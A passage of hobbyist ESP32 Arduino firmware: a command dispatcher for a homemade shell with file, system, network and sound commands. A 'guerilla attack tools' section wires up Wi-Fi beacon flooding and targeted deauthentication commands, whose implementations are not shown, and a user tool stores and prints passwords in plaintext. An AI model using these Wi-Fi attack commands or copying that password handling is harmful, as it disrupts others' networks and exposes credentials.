        String s1 = cmd.substring(6, sp); String s2 = cmd.substring(sp+1);
        tft.printf(">> COMPARE CORRELATION: %s\n", (s1==s2)?"EQUAL (100%)":"DIFFERENT");
    }
  }

  // 114. 내부 Flash 파티션 테이블 가상 노드 레이아웃 검사
  else if (cmd == "part table") {
    tft.println(">> FLASH PARTITION LAYOUT MAP");
    tft.println(" Name     Type     Subtype    Size");
    tft.println(" ---------------------------------");
    tft.println(" nvs      data     nvs        20 KB");
    tft.println(" otadata  data     ota        8 KB");
    tft.println(" app0     app      ota_0      4.5 MB");
    tft.println(" app1     app      ota_1      4.5 MB");
    tft.printf(" storage  data     fat        6.8 MB\n");
  }

  // 115. 외부 가상 핑 리퀘스트 대기용 ICMP 패킷 세션 브레이커 시뮬레이터
  else if (cmd == "ping kill") {
    tft.println(">> ALL ACTIVE INTERRUPT PING REQUEST TERMINATED DEFENSIVELY.");
  }

  // 116. 스크린 잔상 제거용 미세 화소 반전 복구 패턴 스트리밍
  else if (cmd == "tft burnin fix") {
    tft.println(">> FLUSHING LIQUID CRYSTAL MATRIX...");
    for(int i=0; i<3; i++) {
        tft.fillScreen(TFT_WHITE); delay(200);
        tft.fillScreen(TFT_BLACK); delay(200);
    }
    tft.setTextColor(TFT_GREEN); tft.println(">> LIQUID CRYSTAL RESTORED.");
  }

  // 117. 고속 전력 모니터링 버스 전하 감쇄 가상 프로파일링
  else if (cmd == "power matrix") {
    tft.println(">> REAL-TIME BUS LOAD FACTOR");
    tft.printf(" - Core VDD Volt Est : 3.314 V [STABLE]\n");
    tft.printf(" - RF Transceiver Load: %s\n", (WiFi.status()==WL_CONNECTED)?"45 mA":"12 mA");
  }

  // 118. 시스템 커널 경고음 (모스 부호 SOS 수동 가속 매핑)
  else if (cmd == "sys sos") {
    tft.println(">> BROADCASTING AUDIBLE SOS SIGNAL...");
    for(int i=0; i<3; i++) { pz(2000, 100); delay(100); } // S
    delay(200);
    for(int i=0; i<3; i++) { pz(2000, 300); delay(100); } // O
    delay(200);
    for(int i=0; i<3; i++) { pz(2000, 100); delay(100); } // S
  }

  // 119. 파일의 앞부분 16바이트만 아스키로 빠르게 요약 파싱 (간이 헤더 스니퍼)
  else if (cmd.startsWith("sniffhead ")) {
    String file = cmd.substring(10); file.trim();
    if (!file.startsWith("/")) file = currentPath + (currentPath.endsWith("/") ? "" : "/") + file;
    File f = SD.open(file.c_str(), FILE_READ);
    if(f) {
        tft.print(">> ASCII HEADERS: ");
        for(int i=0; i<16 && f.available(); i++) {
            char c = f.read();
            if(c >= 32 && c <= 126) tft.print(c);
            else tft.print(".");
        }
        f.close(); tft.println();
    } else tft.println("!! FILE NOT FOUND");
  }

  // 120. 시스템 전역 환경 변수 가상 테이블 조회
  else if (cmd == "env") {
    tft.println(">> ATK CORE ENVIRONMENT VARIABLES");
    tft.printf(" SHELL=%s\n", "ATK_Shell_v1.1");
    tft.printf(" PATH=%s\n", "/Ardudows/System:/bin");
    tft.printf(" USER=%s\n", auicUsername.c_str());
    tft.printf(" TERM_COLOR=%s\n", "TFT_GREEN_MATRIX");
  }

  // 121. 삼각함수 탄젠트 라디안 테이블 고속 연산 매핑 벤치마크
  else if (cmd.startsWith("math tan ")) {
    float val = cmd.substring(9).toFloat();
    tft.printf(">> tan(%.2f rad) = %.5f\n", val, tan(val));
  }

  // 122. 지정 파일에 텍스트 데이터 개행(Append) 모드로 바로 밀어 넣기
  else if (cmd.startsWith("append ")) {
    // 사용법: append [파일] [텍스트]
    int sp = cmd.indexOf(' ', 7);
    if(sp > 0) {
        String file = cmd.substring(7, sp); String text = cmd.substring(sp+1);
        if (!file.startsWith("/")) file = currentPath + (currentPath.endsWith("/") ? "" : "/") + file;
        File f = SD.open(file.c_str(), FILE_APPEND);
        if(f) { f.println(text); f.close(); tft.println(">> Stream Appended."); }
        else tft.println("!! WRITE PROTECTED OR SD ERROR");
    }
  }

  /*
  // 123. 무선 스니퍼 모드 기동 전 하드웨어 레디오 전하 셧다운 체크 유닛
  else if (cmd == "rf status") {
    tft.println(">> RF TRANSCEIVER CORE REGISTERS");
    uint32_t rf_reg = READ_PERI_REG(SYSTEM_SYSCLK_CONF_REG);
    tft.printf(" - MAC Link Base Gate Check: 0x%08X\n", rf_reg);
  }
  */

  // 124. 정밀 소수점 제곱근 연산 가속 하드웨어 FPU 확인 엔진
  else if (cmd.startsWith("math sqrt ")) {
    float val = cmd.substring(10).toFloat();
    if(val >= 0) tft.printf(">> sqrt(%.2f) = %.5f\n", val, sqrt(val));
    else tft.println("!! MATH DOMAIN ERROR");
  }

  // 125. 복수 디렉토리 경로 체인 강제 리셋 (경로 꼬임 원천 방어)
  else if (cmd == "cd reset") {
    currentPath = "/";
    tft.println(">> Shell Working Path Forced Back to Root [/]");
  }

  // 126. 실시간 프리 RTOS 클록 틱 카운트 정밀 검사
  else if (cmd == "kernel ticks") {
    tft.printf(">> OS KERNEL TOTAL TICK COUNT: %lu Ticks\n", xTaskGetTickCount());
  }

  // 127. 터미널 로고 컬러 테마 임시 스왑 (반전 매트릭스 테마)
  else if (cmd == "color retro") {
    tft.setTextColor(TFT_ORANGE);
    tft.println(">> COMPILER THEME RE-RENDERED TO RETRO AMBER CONSOLE.");
  }

  // 128. 무선 패킷 인터럽트 드라이버 완전 수동 바인딩 해제
  else if (cmd == "wifi stop") {
    esp_wifi_stop();
    tft.println(">> Wi-Fi Stack completely destroyed from silicon layer.");
  }

  // 129. 무선 패킷 인터럽트 드라이버 수동 커널 재배치 및 활성화
  else if (cmd == "wifi start") {
    esp_wifi_start();
    tft.println(">> Wi-Fi Stack freshly linked onto core driver matrix.");
  }

  // 130. 시스템 완전 파괴 방지용 보안 레벨 잠금 모니터
  else if (cmd == "sys secure") {
    tft.println(">> ARDUDOWS KERNEL PROTECTION LEVEL");
    tft.printf(" - Memory Write Lock: SAFE BLOCK ACTIVE\n");
    tft.printf(" - Core Integrity Check Flag: 0x%02X [GOOD]\n", esp_reset_reason());
  }

  // --- [ ARDUDOWS INTERPRETER SYSTEM ] ---
  else if (cmd.startsWith("lib ")) {
    cmd_lib_dispatcher(cmd);
  }

  // --- [ 🔥 NEW CHAT-BUILT SEARCH COMMANDS 🔥 ] ---
  else if (cmd.startsWith("where ")) {
    String searchTarget = cmd.substring(6);
    searchTarget.trim();
    tft.printf("🔍 Hunting '%s'...\n", searchTarget.c_str());
    
    File root = SD.open("/");
    cmd_where(root, searchTarget.c_str());
    root.close();
  }
  else if (cmd.startsWith("what ")) {
    String filePath = cmd.substring(5);
    filePath.trim();
    cmd_what(filePath.c_str());
  }

  // --- [ NETWORK & WIFI ] ---
  else if (cmd == "wifi scan")
    cmd_wifi_scan();
  else if (cmd.startsWith("wifi connect ")) {
    int sp = cmd.indexOf(' ', 13);
    if (sp > 0) {
      String ssid = cmd.substring(13, sp);
      String pass = cmd.substring(sp + 1);
      cmd_wifi_connect(ssid, pass);
    }
  } else if (cmd.startsWith("ping ")) cmd_ping(cmd.substring(5));
  else if (cmd.startsWith("nslookup ")) cmd_nslookup(cmd.substring(9));
  else if (cmd.startsWith("curl ")) cmd_curl(cmd.substring(5));

  // --- [ BLUETOOTH ] ---
  else if (cmd == "ble init") cmd_ble_init();
  else if (cmd == "ble scan") cmd_ble_scan();
  else if (cmd.startsWith("ble connect ")) cmd_ble_connect(cmd.substring(12).toInt());
  else if (cmd == "ble disconnect") cmd_ble_disconnect();
  else if (cmd.startsWith("ble info ")) {
    // "ble info " 가 9글자이므로, 그 이후의 문자열(숫자)을 가져옵니다.
    int idx = cmd.substring(9).toInt(); 
    cmd_ble_info(idx);
  } 

  // --- [ HARDWARE I/O ] ---
  else if (cmd.startsWith("gpio read ")) cmd_gpio_read(cmd.substring(10).toInt());
  else if (cmd.startsWith("gpio write ")) {
    int sp = cmd.indexOf(' ', 11);
    if (sp > 0) {
      int pin = cmd.substring(11, sp).toInt();
      int val = cmd.substring(sp + 1).toInt();
      cmd_gpio_write(pin, val);
    }
  } else if (cmd == "i2c scan") cmd_i2c_scan();

  // --- [ HACK SYSTEM (Guerilla Mode) ] ---
  // --- [ ARDUDOWS PORTING SYSTEM ] ---
  else if (cmd.startsWith("porting ")) {
    cmd_porting(cmd.substring(8));
  }
  
  // --- [ GUERILLA ATTACK TOOLS ] ---
  else if (cmd == "hack spam") {
    // 32자 랜덤 비콘 폭격 (아까 만든 거)
    cmd_hack_spam(); 
  }

  // --- [ RF ANALYSIS MODE ] ---
  else if (cmd == "detect") cmd_hack_detector(); // 주변 신호 세기 목록
  else if (cmd == "wave") cmd_hack_wave();     // 실시간 전파 요동 시각화

  else if (cmd == "hack list") {
    cmd_hack_list();
  }
  else if (cmd.startsWith("hack deauth ")) {
    // 사용법: hack deauth [TargetMAC] [AP_MAC]
    // 예: hack deauth AA:BB:CC:11:22:33 DD:EE:FF:44:55:66
    String args = cmd.substring(12);
    int spaceIndex = args.indexOf(' ');
    String target = args.substring(0, spaceIndex);
    String ap = args.substring(spaceIndex + 1);
    cmd_hack_deauth(target, ap);
  }

  // --- [ MINECRAFT SERVER ENGINE ] ---
  else if (cmd.startsWith("minecraft server")) {
    tft.fillScreen(TFT_NAVY);
    tft.setCursor(0, 0);
    tft.setTextColor(TFT_WHITE);
    tft.println("=== [ARDUDOWS MC v10.0] ===");
    tft.setTextColor(TFT_YELLOW);
    tft.println(">> CONFIGURING ENGINE...");

    // 1. 명령어 전체를 던져서 설정값 파싱
    parseCommandToConfig(cmd);

    // 2. 설정이 완료된 후 서버 가동
    tft.println(">> BOOTING SERVER ENGINE...");
    
    // EULA 확인 로직을 startMinecraftServer 안으로 통합하거나 여기서 체크
    if (worldConfig.eulaAccepted) {
      minecraft_server(); 
    } else {
      tft.setTextColor(TFT_RED);
      tft.println("[!] EULA REJECTED. ABORTING.");
    }

    tft.setTextColor(TFT_GREEN);
  }

  else if (cmd == "wh") {
    Start_Who_is_Hacker();
  }

  // executeCommand 내부에 추가
  else if (cmd == "monitor") {
    tft.fillScreen(TFT_BLACK);
    while(!Serial.available()) { // 아무 키나 누를 때까지 실시간 갱신
      tft.setCursor(0, 0);
      tft.setTextColor(TFT_CYAN, TFT_BLACK);
      tft.printf("CPU Temp: %.2f C    \n", temperatureRead());
      tft.printf("Free Heap: %d KB   \n", ESP.getFreeHeap() / 1024);
      tft.printf("Uptime: %lu sec    \n", millis() / 1000);
    
      // 게이지 바 같은 거 하나 그려주면 감성 폭발합니다
      int barWidth = map(ESP.getFreeHeap(), 0, ESP.getHeapSize(), 0, 200);
      tft.fillRect(0, 50, 200, 10, TFT_DARKGREY);
      tft.fillRect(0, 50, barWidth, 10, TFT_GREEN);
    
      delay(500); 
    }
  }

  else if (cmd == "mem") {
    tft.println(">> SRAM / HEAP ANALYSIS");
    tft.printf(" - Free Heap: %d KB\n", ESP.getFreeHeap() / 1024);
    tft.printf(" - Min Free : %d KB\n", ESP.getMinFreeHeap() / 1024);
    tft.printf(" - Max Block: %d KB\n", ESP.getMaxAllocHeap() / 1024); // 파편화 확인용
  }
  else if (cmd == "psram") {
      if(psramFound()) {
        tft.println(">> PSRAM (N16R8) STATUS");
        tft.printf(" - Total: %d KB\n", ESP.getPsramSize() / 1024);
        tft.printf(" - Free : %d KB\n", ESP.getFreePsram() / 1024);
        tft.printf(" - Max Block: %d KB\n", ESP.getMaxAllocPsram() / 1024);
      } else tft.println("!! PSRAM NOT FOUND");
  }

  // --- [ 2. FLASH & SKETCH INFO ] ---
  else if (cmd == "flash") {
    tft.println(">> FLASH CHIP INFO");
    tft.printf(" - Size : %d MB\n", ESP.getFlashChipSize() / (1024*1024));
    tft.printf(" - Speed: %d MHz\n", ESP.getFlashChipSpeed() / 1000000);
    //tft.printf(" - Mode : %s\n", (ESP.getFlashChipMode() == M_OPI) ? "OPI (FAST)" : "SPI");
  }
  else if (cmd == "sketch") {
    tft.println(">> FIRMWARE INFO");
    tft.printf(" - Size: %d KB\n", ESP.getSketchSize() / 1024);
    tft.printf(" - Free: %d KB\n", ESP.getFreeSketchSpace() / 1024);
    tft.printf(" - MD5 : %s\n", ESP.getSketchMD5().c_str());
  }

  // --- [ 3. CPU & HW IDENT ] ---
  else if (cmd == "hw") {
    tft.println(">> HARDWARE IDENTIFICATION");
    tft.printf(" - Chip : %s (Rev %d)\n", ESP.getChipModel(), ESP.getChipRevision());
    tft.printf(" - Core : %d Cores @ %dMHz\n", ESP.getChipCores(), ESP.getCpuFreqMHz());
    tft.printf(" - SDK  : %s\n", ESP.getSdkVersion());
  }
  else if (cmd == "mac") {
    tft.printf(">> EFUSE MAC: %llX\n", ESP.getEfuseMac());
  }
  else if (cmd == "temp") {
    tft.printf(">> CPU TEMP: %.2f C\n", temperatureRead());
  }

  // --- [ 4. RUNTIME & CONTROL ] ---
  else if (cmd == "cycles") {
    tft.printf(">> CYCLE COUNT: %llu\n", ESP.getCycleCount());
  }
  else if (cmd == "reason") {
    tft.printf(">> RESET REASON: %d\n", (int)esp_reset_reason());
  }
  else if (cmd.startsWith("sleep ")) {
    int sec = cmd.substring(6).toInt();
    tft.printf(">> DEEP SLEEP: %d SEC\n", sec);
    ESP.deepSleep(sec * 1000000ULL);
  }
    
  // --- [ 5. REAL-TIME GPIO SCAN (아까 만든 것) ] ---
  else if (cmd == "gpio check") {
    esp_gpio_check(); //
  }

  else if (cmd == "router") {
    run_router_install();
  }

  else if (cmd.startsWith("pz ")) {
    // "pz 1000 500" (주파수 1000Hz, 500ms 동안)
    int firstSpace = cmd.indexOf(' ', 3); 
    if (firstSpace != -1) {
        int freq = cmd.substring(3, firstSpace).toInt();
        int duration = cmd.substring(firstSpace + 1).toInt();

        if (freq > 0) {
            tft.printf(">> BEEP: %d Hz, %d ms\n", freq, duration);
            pz(freq, duration); // 형님의 pz 함수 호출! ㅋㅋㅋㅋ
        } else {
            tft.println(">> Error: Invalid Frequency!");
        }
    } else {
        // 지속시간 안 쓰고 "pz 1000"만 쳤을 때 기본값 처리 ㅋㅋㅋㅋ
        int freq = cmd.substring(3).toInt();
        tft.printf(">> BEEP: %d Hz (Default 100ms)\n", freq);
        pz(freq, 100);
    }
  }

  // --- [ 4.5 PIANO PLAYER (221 SERVER EXCLUSIVE) ] ---
  else if (cmd.startsWith("play ")) {
    // "play 12345 200" 형태로 입력받기
    int firstSpace = cmd.indexOf(' ', 5);
    String melody;
    int tempo = 200; // 기본값 200ms

    if (firstSpace != -1) {
      melody = cmd.substring(5, firstSpace);
      tempo = cmd.substring(firstSpace + 1).toInt();
    } else {
      melody = cmd.substring(5);
    }

    tft.printf(">> PLAYING (Tempo:%d): %s\n", tempo, melody.c_str());

    // 0:미(높음), 1~8:도~도, 9:레(높음)
    int scale[] = {659, 262, 294, 330, 349, 392, 440, 494, 523, 587, 659}; 
    
    for (int i = 0; i < melody.length(); i++) {
      char note = melody.charAt(i);
      
      if (note >= '1' && note <= '9') { 
        int n = note - '0';
        pz(scale[n], tempo); 
      } 
      else if (note == '0') { 
        pz(scale[0], tempo); // 수정 완료! ㅋㅋㅋㅋ
      }
      else if (note == '_') {
        delay(tempo); 
      }
      
      // 음 사이의 찰진 간격
      delay(tempo * 0.1); 
    }
    tft.println(">> PLAY DONE.");
  }

  //else if (cmd == "rtc") {
    //tft.printf(">> TIME: %s\n", getNowTime().c_str());
  //}

  // --- [ Ardudows Professional Math Engine ] ---
  else if (cmd.startsWith("calc ")) {
    String expression = cmd.substring(5); // "calc " 뒷부분만 싹 가져옴
    expression.trim();
    
    if (expression.length() > 0) {
        tft.setTextColor(TFT_YELLOW);
        tft.print(">> CALC: ");
        tft.setTextColor(TFT_WHITE);
        tft.println(expression);
        tft.setTextColor(TFT_GREEN);
        
        // 형님이 만든 무적의 엔진 호출!
        Profecalc(expression); 
    } else {
        tft.println("Usage: calc <expression>");
        tft.println("Ex: calc 5+3*sqrt(16)");
    }
    tft.setTextColor(TFT_GREEN);
  }

  // --- [ ARDUDOWS VNC DIRECT ENGINE ] ---
  /*
  else if (cmd.startsWith("vnc")) {
    // 1. 기본값 설정 (S25 형님 서버 주소)
    String targetIP = "192.168.0.21"; 
    uint16_t targetPort = 5901; 

    // 2. 명령어 파싱 (vnc [IP] [PORT])
    int firstSpace = cmd.indexOf(' ');
    if (firstSpace != -1) {
      String args = cmd.substring(firstSpace + 1);
      args.trim(); // 앞뒤 공백 제거
      
      int secondSpace = args.indexOf(' ');
      if (secondSpace != -1) {
        // IP와 Port가 모두 입력된 경우 (예: vnc 1.1.1.1 5900)
        targetIP = args.substring(0, secondSpace);
        targetPort = args.substring(secondSpace + 1).toInt();
      } else if (args.length() > 0) {
        // IP만 입력된 경우 (예: vnc 1.1.1.1)
        targetIP = args;
      }
    }

    // 3. UI 알림 및 엔진 실행
    tft.fillScreen(TFT_BLACK);
    tft.setCursor(0, 0);
    tft.setTextColor(TFT_MAGENTA);
    tft.println(">> VNC RAW ENGINE START");
    tft.setTextColor(TFT_WHITE);
    tft.printf("Target: %s:%d\n", targetIP.c_str(), targetPort);
    
    // 우리가 만든 그 함수 호출!
    vnc(targetIP.c_str(), targetPort);

    // 종료 후 복귀 UI
    tft.fillScreen(TFT_BLACK);
    tft.setTextColor(TFT_GREEN);
    tft.println(">> VNC Session Terminated.");
  }
  */

  else if (cmd.startsWith("wifi ap ")) {
    cmd_wifi_ap(cmd);
  }

  // ================== ARS ==================
  else if (cmd.startsWith("ars ")) {
    String sub = cmd.substring(4);
    sub.trim();

    if (sub == "mem") ars_mem();
    else if (sub == "temp") ars_temp();
    else if (sub == "wifi") ars_wifi();
    else if (sub == "check") ars_check();
    else if (sub == "purge") ars_purge();
    else if (sub == "reset") ESP.restart();
    else tft.println("ARS: unknown command");
  }

  else if (cmd == "web drive") {
    Web_Drive();
  }

  else if (cmd == "top") {
    tft.fillScreen(TFT_BLACK);
    tft.setCursor(0, 0);
    tft.setTextColor(TFT_CYAN);
    tft.println("[ ARDUDOWS PROCESS MONITOR ]");
    tft.println("----------------------------");
    tft.setTextColor(TFT_WHITE);
    tft.printf("CPU Freq: %d MHz\n", ESP.getCpuFreqMHz());
    tft.printf("Internal RAM: %d / %d KB\n", ESP.getFreeHeap()/1024, ESP.getHeapSize()/1024);
    tft.printf("PSRAM Usage: %d / %d KB\n", (ESP.getPsramSize()-ESP.getFreePsram())/1024, ESP.getPsramSize()/1024);
    tft.printf("Min Free Heap: %d KB\n", ESP.getMinFreeHeap()/1024);
    tft.println("----------------------------");
    tft.setTextColor(TFT_YELLOW);
    tft.println("Status: [SYSTEM RUNNING]");
    // 여기서 TaskList 등을 뿌려주면 진짜 top 완성!
    tft.setTextColor(TFT_GREEN);
  }

  else if (cmd == "nmap") {
    tft.println(">> ACTIVE NETWORK CONNECTIONS");
    tft.printf(" - Local IP: %s\n", WiFi.localIP().toString().c_str());
    tft.printf(" - AP IP: %s\n", WiFi.softAPIP().toString().c_str());
    tft.printf(" - RSSI: %d dBm\n", WiFi.RSSI());
    // 웹소켓 클라이언트 수 표시 (ws는 형님의 AsyncWebSocket 객체 이름에 맞게 수정)
    // tft.printf(" - WS Clients: %d\n", ws.count()); 
  }

  else if (cmd == "neofetch") {
    tft.setTextColor(TFT_MAGENTA);
    tft.println("      _      ____  ____  ");
    tft.println("     / \\    |  _ \\|  _ \\ ");
    tft.println("    / _ \\   | |_) | |_) |");
    tft.println("   / ___ \\  |  _ <|  _ < ");
    tft.println("  /_/   \\_\\ |_| \\_\\_| \\_\\");
    tft.setTextColor(TFT_WHITE);
    tft.println("----------------------------");
    tft.printf("OS: Ardudows Professional v1.1\n");
    tft.printf("Kernel: ESP32-S3 Arduino v3.3.8\n");
    tft.printf("Uptime: %lu min\n", millis() / 60000);
    tft.printf("Memory: %d KB / %d KB\n", ESP.getFreeHeap()/1024, ESP.getHeapSize()/1024);
    tft.printf("Terminal: ATK Shell\n");
  }

  else if (cmd.startsWith("nano ")) {
    String filename = cmd.substring(5);
    filename.trim();

    if (filename == "") {
      tft.println("Usage: nano <filename>");
    } else {
      // 1. 경로 보정: 유저가 파일명만 쳤을 때 현재 위치(dosCurrentPath)를 붙여줌
      String fullPath = filename;
      if (!filename.startsWith("/")) {
        fullPath = currentPath;
        if (!fullPath.endsWith("/")) fullPath += "/";
        fullPath += filename;
      }

      // 2. 권한/존재 확인 (선택 사항: 폴더를 nano로 열려고 하면 막아야 함)
      if (SD.open(fullPath.c_str()).isDirectory()) { tft.println("Error: Is a directory"); return; }

      tft.print("Opening Editor: ");
      tft.println(filename);

      // 3. 에디터 실행 (보정된 절대 경로를 넘겨줌)
      run_nano(fullPath); 

      // 에디터 종료 후 화면 복구 (필요시)
      // tft.fillScreen(TFT_BLACK);
      // ADOS_Shell_Redraw(); 
    }
  }

  else if (cmd == "sl") {
    tft.fillScreen(TFT_BLACK);
    for (int i = 320; i > -100; i -= 10) { // 화면 오른쪽에서 왼쪽으로
      tft.setCursor(i, 100);
      tft.setTextColor(TFT_WHITE);
      tft.println("      ====  ____  ");
      tft.setCursor(i, 110);
      tft.println("  _][HD  n  |oo| ");
      tft.setCursor(i, 120);
      tft.println("b|_________||__| ");
      tft.setCursor(i, 130);
      tft.println("  ss  oo  oo  ss ");
      delay(50);
      tft.fillRect(i, 100, 150, 50, TFT_BLACK); // 잔상 제거
    }
    tft.println("Choo Choo!");
  }

    // --- [ 🌐 ALIAS 동적 관리 및 실행 엔진 ] ---
  
  // 1. 등록 기능: alias c=cls 치면 딕셔너리에 실시간 누적
  else if (cmd.startsWith("alias ")) {
    String pair = cmd.substring(6); // "c=cls"
    int eqIdx = pair.indexOf('=');
    if (eqIdx > 0) {
      String sCut = pair.substring(0, eqIdx);
      String rCmd = pair.substring(eqIdx + 1);
      sCut.trim(); rCmd.trim();

      // 기존에 등록된 게 있으면 덮어쓰기, 없으면 새로 추가
      bool found = false;
      for (int i = 0; i < aliasCount; i++) {
        if (myAliases[i].shortCut == sCut) {
          myAliases[i].realCmd = rCmd;
          found = true;
          break;
        }
      }
      if (!found && aliasCount < 10) {
        myAliases[aliasCount].shortCut = sCut;
        myAliases[aliasCount].realCmd = rCmd;
        aliasCount++;
      }
      tft.printf("Alias Registered: %s -> %s\n", sCut.c_str(), rCmd.c_str());
    }
  }

  // 2. 단독으로 alias만 치면 현재 등록된 목록 싹 다 덤프
  else if (cmd == "alias") {
    tft.println(">> CURRENT ACTIVE ALIASES:");
    for (int i = 0; i < aliasCount; i++) {
      tft.printf(" %s='%s'\n", myAliases[i].shortCut.c_str(), myAliases[i].realCmd.c_str());
    }
  }

  else if (cmd == "whoami") {
    tft.printf("Current User: %s\n", auicUsername.c_str());
    tft.printf("Authority: %s\n", auicAuthority.c_str());
  }

  else if (cmd.startsWith("perf tester")) {

    cmd.replace("perf tester", "");
    cmd.trim();

    int s1 = cmd.indexOf(' ');
    int s2 = cmd.indexOf(' ', s1 + 1);

    if (s1 < 0 || s2 < 0) return;

  String mode = cmd.substring(0, s1);
    String confirm = cmd.substring(s1 + 1, s2);
    int time = cmd.substring(s2 + 1).toInt();

    PerfMode m;

    if (mode == "cpu") m = MODE_CPU;
    else if (mode == "fps") m = MODE_FPS;
    else if (mode == "fpu") m = MODE_FPU;
    else if (mode == "screen") m = MODE_SCREEN;
    else if (mode == "frame") m = MODE_FRAME;
    else if (mode == "sram") m = MODE_SRAM;
    else if (mode == "psram") m = MODE_PSRAM;
    else if (mode == "sd") m = MODE_SD;
    else if (mode == "vector") m = MODE_VECTOR;
    else if (mode == "full") m = MODE_FULL;
    else if (mode == "tiny") m = MODE_TINY;
    else return;

    perf_tester(m, confirm, time);
  }

  // --- [ RAM MANAGEMENT (God Mode) ] ---
  // 형님, 여기서부터 ram 시리즈가 들어갑니다!
  else if (cmd.startsWith("ram ")) {
    // "ram " 뒷부분만 떼어서 핸들러로 전달
    String ramCmd = cmd.substring(4);
    ramCmd.trim();
    cmd_ram(ramCmd);
  }

  else if (cmd == "who") {
    tft.println("Registered Users:");
    tft.println("-----------------");
    // Registry를 순회하면서 USER_ 로 시작하는 섹션 다 뽑아오기
    for (int i = 0; i < registry_count; i++) {
      if (String(registry[i].section).startsWith("USER_")) {
        tft.printf("- %s (%s)\n", 
                    Registry_Get(registry[i].section, "Username"),
                    Registry_Get(registry[i].section, "Authority"));
      }
    }
  }

  else if (cmd.startsWith("mkdir ")) {
    String parts[3]; // 수정: 배열 선언 필수
    int partCount = 0;
    int startIdx = 0;
    int spaceIdx = cmd.indexOf(' ');

    while (spaceIdx != -1 && partCount < 2) {
      parts[partCount++] = cmd.substring(startIdx, spaceIdx);
      startIdx = spaceIdx + 1;
      spaceIdx = cmd.indexOf(' ', startIdx);
    }
    parts[partCount++] = cmd.substring(startIdx);

    String finalPath = "";

    if (partCount == 3) {
      String baseDir = parts[1]; // 수정: 배열 인덱스 명시
      String newDir = parts[2];
      if (!baseDir.endsWith("/")) baseDir += "/";
      finalPath = baseDir + newDir;
    } 
    else if (partCount == 2) {
      String newDir = parts[1];
      String baseDir = currentPath;
      if (!baseDir.endsWith("/")) baseDir += "/";
      finalPath = baseDir + newDir;
    } 

    if (finalPath != "") {
      if (SD.exists(finalPath.c_str())) {
        tft.println("Error: Target already exists!");
      } else {
        if (SD.mkdir(finalPath.c_str())) {
          tft.print("Success: "); tft.println(finalPath);
          // 수정: log -> hLog (수학 함수와 충돌 방지)
          File hLog = SD.open("/dos/history.log", FILE_APPEND);
          if(hLog) { hLog.println("[MKDIR] " + finalPath); hLog.close(); }
        } else {
          tft.println("SD Write Error!");
        }
      }
    }
  }

  else if (cmd.startsWith("usertool ")) {
    String parts[4]; // 수정: 배열 선언 필수
    int partCount = 0;
    int startIdx = 0;
    int spaceIdx = cmd.indexOf(' ');

    while (spaceIdx != -1 && partCount < 3) {
      parts[partCount++] = cmd.substring(startIdx, spaceIdx);
      startIdx = spaceIdx + 1;
      spaceIdx = cmd.indexOf(' ', startIdx);
    }
    parts[partCount++] = cmd.substring(startIdx);

    String action = parts[1]; // 수정: 배열 인덱스 명시
    action.toLowerCase();

    if (action == "add" && partCount >= 4) {
      String name = parts[2];
      String pass = parts[3];
      String path = "/Ardudows/Users/" + name;

      if (SD.exists(path)) {
        tft.println("User already exists!");
      } else {
        SD.mkdir(path.c_str());
        String sect = "USER_" + name;
        Registry_Set(sect.c_str(), "ID", name.c_str());
        Registry_Set(sect.c_str(), "PW", pass.c_str());
        Registry_Save();
        tft.printf("User [%s] added.\n", name.c_str());
      }
   }
    else if (action == "copy" && partCount >= 3) {
      String src = parts[2];
      if (!SD.exists("/Ardudows/Users/" + src)) {
        tft.println("Source not found.");
      } else {
        String dest;
        int i = 1;
        while(true) {
          dest = src + "_cp" + String(i);
          if (!SD.exists("/Ardudows/Users/" + dest)) break;
          i++;
        }
        SD.mkdir(("/Ardudows/Users/" + dest).c_str());
        String dstSect = "USER_" + dest;
        Registry_Set(dstSect.c_str(), "ID", dest.c_str());
        Registry_Set(dstSect.c_str(), "PW", Registry_Get(("USER_" + src).c_str(), "PW"));
        Registry_Save();
        tft.println("Cloned: " + dest);
      }
    }
    else if (action == "chpw" && partCount >= 4) {
      String name = parts[2];
      String newPw = parts[3];
      String sect = "USER_" + name;
      if (String(Registry_Get(sect.c_str(), "ID")) == "") {
        tft.println("User not found.");
      } else {
        Registry_Set(sect.c_str(), "PW", newPw.c_str());
        Registry_Save();
        tft.println("PW updated.");
      }
    }
    else if (action == "info" && partCount >= 3) {
      String name = parts[2];
      String sect = "USER_" + name;
      tft.println(">> USER: " + name);
      tft.println(">> PASS: " + String(Registry_Get(sect.c_str(), "PW")));
    }
    else {
      tft.println("Usage: usertool [add|copy|chpw|info]");
    }
  }

  else if (cmd.startsWith("rmdir ")) {
    String target = cmd.substring(6);
    target.trim();

    if (target == "/" || target == "/Ardudows" || target == "/Ardudows/System") {
      tft.setTextColor(TFT_RED);
      tft.println("FATAL ERROR: Access Denied!");
      tft.setTextColor(TFT_WHITE);
      return;
    }

    String fullPath = target;
    if (!target.startsWith("/")) {
      fullPath = currentPath;
      if (!fullPath.endsWith("/")) fullPath += "/";
      fullPath += target;
    }

    if (SD.rmdir(fullPath.c_str())) {
      tft.println("Directory removed.");
      File hLog = SD.open("/dos/history.log", FILE_APPEND);
      if(hLog) { hLog.println("[RMDIR] " + fullPath); hLog.close(); }
    } else {
      tft.println("Fail: Not empty or not found.");
    }
  }

  // --- [COPY / CUT 명령어] ---
  else if (cmd.startsWith("copy ") || cmd.startsWith("cut ")) {
    clipIsCut = cmd.startsWith("cut ");
    // 명령어(4~5글자) 뒤의 경로만 추출
    clipPath = cmd.substring(clipIsCut ? 4 : 5);
    clipPath.trim();

    // 상대 경로를 절대 경로로 보정 (현재 DOS 경로 기준)
    if (!clipPath.startsWith("/")) {
      String base =  currentPath;
      if (!base.endsWith("/")) base += "/";
      clipPath = base + clipPath;
    }

    if (SD.exists(clipPath.c_str())) {
      tft.setTextColor(TFT_YELLOW);
      tft.println(clipIsCut ? "Target marked for CUT." : "Target marked for COPY.");
      tft.setTextColor(TFT_WHITE);
    } else {
      tft.println("Error: File not found!");
      clipPath = ""; // 경로 초기화
    }
  }

  // --- [PASTE 명령어] ---
  else if (cmd == "paste") {
    if (clipPath == "") {
      tft.println("Error: Clipboard is empty!");
      return;
    }

    // 1. 목적지 경로 생성 (현재 폴더 + 원본 파일명)
    String fileName = clipPath.substring(clipPath.lastIndexOf('/') + 1);
    String destPath = currentPath;
    if (!destPath.endsWith("/")) destPath += "/";
    destPath += fileName;

    // 2. 자기 자신에게 붙여넣기 방지
    if (clipPath == destPath) {
      tft.println("Error: Cannot copy to the same location.");
      return;
    }

    tft.print("Processing: " + fileName + "...");

    // 3. 실제 파일 데이터 전송 (바이트 노가다)
